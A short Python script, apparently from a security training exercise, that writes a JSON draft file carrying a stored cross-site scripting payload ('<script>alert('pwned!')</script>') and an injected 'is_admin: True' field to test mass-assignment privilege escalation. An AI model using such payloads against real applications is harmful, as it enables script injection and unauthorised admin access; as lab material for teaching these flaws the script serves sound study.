#!/usr/bin/env python3
import json

def make_vulnerable_draft(path='evil.draft'):
    # Любые поля можно добавить или подменить
    draft = {
        "title": "Hacked Post",
        "content": "<script>alert('pwned!')</script>",
        # Студент может добавить свои поля — например, is_admin
        "is_admin": True
    }
    with open(path, 'w', encoding='utf-8') as f:
        json.dump(draft, f)
    print(f"[+] Vulnerable draft written to {path}")

if __name__ == "__main__":
    make_vulnerable_draft()
